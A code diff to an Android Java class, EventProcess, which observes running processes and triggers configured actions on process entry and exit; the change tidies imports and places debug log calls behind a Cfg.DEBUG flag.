@@ -11,16 +11,15 @@ package com.android.service.event;
 
 import java.io.IOException;
 
-import android.test.IsolatedContext;
 import android.util.Log;
 
+import com.android.service.ProcessInfo;
+import com.android.service.ProcessStatus;
+import com.android.service.auto.Cfg;
 import com.android.service.interfaces.Observer;
 import com.android.service.listener.ListenerProcess;
 import com.android.service.util.DataBuffer;
 import com.android.service.util.WChar;
-import com.android.service.ProcessInfo;
-import com.android.service.ProcessStatus;
-import com.android.service.RunningProcesses;
 
 public class EventProcess extends EventBase implements Observer<ProcessInfo> {
 	/** The Constant TAG. */
@@ -59,7 +58,7 @@ public class EventProcess extends EventBase implements Observer<ProcessInfo> {
 
 			name = WChar.getString(procName, true);
 		} catch (final IOException e) {
-			Log.d("QZ", TAG + " Error: params FAILED");
+			if(Cfg.DEBUG) Log.d("QZ", TAG + " Error: params FAILED");
 
 			return false;
 		}
@@ -99,12 +98,12 @@ public class EventProcess extends EventBase implements Observer<ProcessInfo> {
 	}
 
 	public void onEnter() {
-		Log.d("QZ", TAG + " (onEnter): triggering " + actionOnEnter + " " + name);
+		if(Cfg.DEBUG) Log.d("QZ", TAG + " (onEnter): triggering " + actionOnEnter + " " + name);
 		trigger(actionOnEnter);
 	}
 
 	public void onExit() {
-		Log.d("QZ", TAG + " (onExit): triggering " + actionOnExit + " " + name);
+		if(Cfg.DEBUG) Log.d("QZ", TAG + " (onExit): triggering " + actionOnExit + " " + name);
 		trigger(actionOnExit);
 	}
 }
